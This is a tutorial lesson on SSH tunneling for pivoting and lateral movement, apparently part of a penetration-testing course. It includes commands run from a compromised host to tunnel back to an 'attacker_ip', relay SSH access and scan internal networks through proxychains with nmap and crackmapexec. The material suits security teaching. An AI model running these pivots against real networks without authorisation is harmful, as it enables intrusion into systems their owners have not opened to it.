# SSH Tunneling

## Unit 9 - Topic 2 | Pivoting and Lateral Movement

---

## Overview

**SSH tunneling** creates encrypted channels through SSH connections to forward ports, create SOCKS proxies, and pivot through compromised Linux/Unix systems. It's one of the most reliable pivoting methods since SSH is commonly available and allowed through firewalls.

---

## 1. SSH Tunnel Types

```
THREE TYPES OF SSH TUNNELS:

LOCAL PORT FORWARDING (-L):
┌──────────┐    SSH Tunnel     ┌──────────┐    ┌──────────┐
│ ATTACKER │ ────────────────→ │ SSH HOST │ ──→│ INTERNAL │
│ :8080    │                   │ (Pivot)  │    │ :80      │
└──────────┘                   └──────────┘    └──────────┘
Access localhost:8080 → reaches INTERNAL:80

REMOTE PORT FORWARDING (-R):
┌──────────┐    SSH Tunnel     ┌──────────┐
│ ATTACKER │ ←────────────────│ SSH HOST │
│ :9090    │                   │ (Pivot)  │
└──────────┘                   └──────────┘
Remote host opens port on attacker's machine

DYNAMIC PORT FORWARDING (-D):
┌──────────┐    SOCKS Proxy    ┌──────────┐    ┌──────────┐
│ ATTACKER │ ────────────────→ │ SSH HOST │ ──→│ ANY HOST │
│ :1080    │                   │ (Pivot)  │    │ ANY PORT │
└──────────┘                   └──────────┘    └──────────┘
SOCKS proxy — route ANY traffic through SSH
```

---

## 2. Local Port Forwarding (-L)

```bash
# === SYNTAX ===
ssh -L LOCAL_PORT:TARGET_HOST:TARGET_PORT user@pivot_host

# === ACCESS INTERNAL WEB SERVER ===
ssh -L 8080:10.0.2.10:80 user@10.0.1.5
# Now: http://localhost:8080 → reaches 10.0.2.10:80

# === ACCESS INTERNAL RDP ===
ssh -L 3389:10.0.2.10:3389 user@10.0.1.5
# Now: xfreerdp /v:localhost:3389

# === ACCESS INTERNAL DATABASE ===
ssh -L 3306:10.0.2.20:3306 user@10.0.1.5
# Now: mysql -h 127.0.0.1 -P 3306 -u root

# === MULTIPLE FORWARDS ===
ssh -L 8080:10.0.2.10:80 \
    -L 8443:10.0.2.10:443 \
    -L 3389:10.0.2.20:3389 \
    user@10.0.1.5

# === USEFUL FLAGS ===
# -N: No shell (tunnel only)
# -f: Background
# -T: Disable TTY
ssh -NfT -L 8080:10.0.2.10:80 user@10.0.1.5
# Creates tunnel in background, no shell
```

---

## 3. Remote Port Forwarding (-R)

```bash
# === SYNTAX ===
ssh -R REMOTE_PORT:TARGET_HOST:TARGET_PORT user@attacker

# USE CASE: Compromised host connects back to attacker
# Opening a port on the attacker's machine

# === REVERSE SHELL RELAY ===
# On compromised host:
ssh -R 9090:localhost:22 user@attacker_ip
# Attacker can now: ssh -p 9090 root@localhost
# → Connects to compromised host's SSH

# === EXPOSE INTERNAL SERVICE ===
# On compromised host (10.0.1.5):
ssh -R 8080:10.0.2.10:80 user@attacker_ip
# Attacker accesses localhost:8080 → reaches 10.0.2.10:80
# Even though attacker can't reach 10.0.2.10 directly!

# === REVERSE SOCKS PROXY ===
ssh -R 1080 user@attacker_ip
# Creates SOCKS proxy on attacker:1080
# Requires: GatewayPorts yes in sshd_config

# === WHEN TO USE -R ===
# ├── Outbound SSH is allowed but inbound is blocked
# ├── Compromised host initiates connection to attacker
# ├── Firewall blocks inbound connections
# └── NAT prevents direct access
```

---

## 4. Dynamic Port Forwarding (-D)

```bash
# === SOCKS PROXY VIA SSH ===
ssh -D 1080 user@10.0.1.5
# Creates SOCKS5 proxy on localhost:1080
# ALL traffic routed through 10.0.1.5

# Background mode:
ssh -NfD 1080 user@10.0.1.5

# === USE WITH PROXYCHAINS ===
# Edit /etc/proxychains4.conf:
# [ProxyList]
# socks5 127.0.0.1 1080

# Now use any tool through the tunnel:
proxychains nmap -sT -Pn 10.0.2.0/24
proxychains curl http://10.0.2.10
proxychains crackmapexec smb 10.0.2.0/24
proxychains ssh admin@10.0.2.10
proxychains firefox    # Browse internal sites

# === USE WITH BROWSER ===
# Firefox: Settings → Network → SOCKS5 → 127.0.0.1:1080
# Browse internal web applications directly
```

---

## 5. Advanced SSH Techniques

```bash
# === SSHUTTLE — VPN Over SSH ===
# Acts like a VPN — no SOCKS/proxychains needed!
sshuttle -r user@10.0.1.5 10.0.2.0/24
# Routes 10.0.2.0/24 through SSH tunnel
# All tools work natively (no proxychains)

# With SSH key:
sshuttle -r user@10.0.1.5 10.0.2.0/24 --ssh-cmd "ssh -i key.pem"

# === SSH OVER JUMP HOST ===
ssh -J user@jump_host user@internal_host
# ProxyJump — chain through multiple hosts

# === SSH CONFIG FOR PERSISTENCE ===
# ~/.ssh/config:
Host pivot
    HostName 10.0.1.5
    User admin
    LocalForward 8080 10.0.2.10:80
    LocalForward 3389 10.0.2.20:3389
    DynamicForward 1080
    ServerAliveInterval 60

# Just: ssh pivot
# All tunnels established automatically

# === DOUBLE SSH TUNNEL ===
# Pivot through two hosts:
ssh -L 2222:10.0.2.10:22 user@10.0.1.5
# Then:
ssh -L 8080:10.0.3.10:80 -p 2222 user@localhost
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **-L (Local)** | Forward local port to remote target |
| **-R (Remote)** | Open port on remote side back to us |
| **-D (Dynamic)** | SOCKS proxy through SSH |
| **sshuttle** | VPN-like SSH tunnel (no proxychains) |
| **ProxyJump (-J)** | Chain through jump hosts |
| **proxychains** | Route tools through SOCKS proxy |

---

## Quick Revision Questions

1. **What is the difference between -L, -R, and -D SSH tunnels?**
2. **When would you use remote (-R) port forwarding?**
3. **How do you create a SOCKS proxy with SSH?**
4. **What advantage does sshuttle have over SSH SOCKS?**
5. **How do you chain SSH tunnels through multiple hosts?**

---

[← Previous: Pivoting Techniques](01-pivoting-techniques.md) | [Next: Port Forwarding →](03-port-forwarding.md)

---

*Unit 9 - Topic 2 of 6 | [Back to README](../README.md)*
